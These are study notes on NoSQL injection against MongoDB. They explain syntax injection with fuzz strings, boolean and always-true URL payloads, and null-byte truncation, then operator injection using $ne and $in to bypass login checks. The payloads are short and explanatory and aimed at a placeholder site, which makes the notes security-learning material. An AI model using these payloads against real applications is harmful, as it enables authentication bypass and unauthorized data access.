-  NoSQL syntax injection - break nosql syntax and execute query 
-  Operator injection - abuse nosql operatoors like $where
  


## NoSQL syntax injection

- like sql injection in queries `break the query syntax` and exploit

#### Detecting syntax injection in MongoDB


- test each input by submitting fuzz strings and special characters

#### FUZZ STRINGS

```
'"`{ ;$Foo} $Foo \xYZ '%00
```

```
' " \ ; { } ( )
```


#### TESTING

https://insecure-website.com/product/lookup?category=fizzy

in sever the query is handled as 

``this.category == 'fizzy'``

- we handle fizzy as input 

- now fuzz the input with the *FUZZ STRINGS*

- check the response and analyse

- determine which character is processed like single quote or double quote

``this.category == '''``

`this.category == '\''`

- now we check for boolean influence (eg to bypass or data retrieval)


- for false output expectation
`https://insecure-website.com/product/lookup?category=fizzy'+&&+0+&&+'x`
- here no categories are displayed since query is false ,

- for true 
`https://insecure-website.com/product/lookup?category=fizzy'+&&+1+&&+'x`
- suggests that the false condition impacts the query logic
- here the category fizzy displayed so ==boolean influence==


#### Overriding existing conditions

- use or `||` operator like output always returns true

`https://insecure-website.com/product/lookup?category=fizzy'||'1'=='1`

- here the server query seems ,

`this.category == 'fizzy'||'1'=='1'`

- thus existing condition overrides and displays all categories


- ==MongoDB may ignore all characters after a null character==

- if server query is 

``this.category == 'fizzy' && this.released == 1``

after null character injection in fizzy as input


`this.category == 'fizzy'\u0000' && this.released == 1`

this would display unreleased object



## operator injection


- operator provide ways to specify conditions to fetch data from db 

- $where, $ne , $in , $regex https://chatgpt.com/share/67641e0a-8aec-800a-8b66-c2ec7950455c


### Injecting into query operators

1) if the server query is
`{"username":"wiener"}
- this queries with the user name = wiener , if data returned from server it returns in response

here we can control wiener input

`{"username":{"$ne":"invalid"}}` ==> `username != invalid `which is true
- this queries the username != invalid which queries every username except invalue


2) `username=wiener` becomes `username[$ne]=invalid`


3) `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`
- this queries data if  username `["admin","administrator","superadmin"]` in db

doesn't work

1. Convert the request method from `GET` to `POST`.
2. Change the `Content-Type` header to `application/json`.
3. Add JSON to the message body.
4. Inject query operators in the JSON.



		












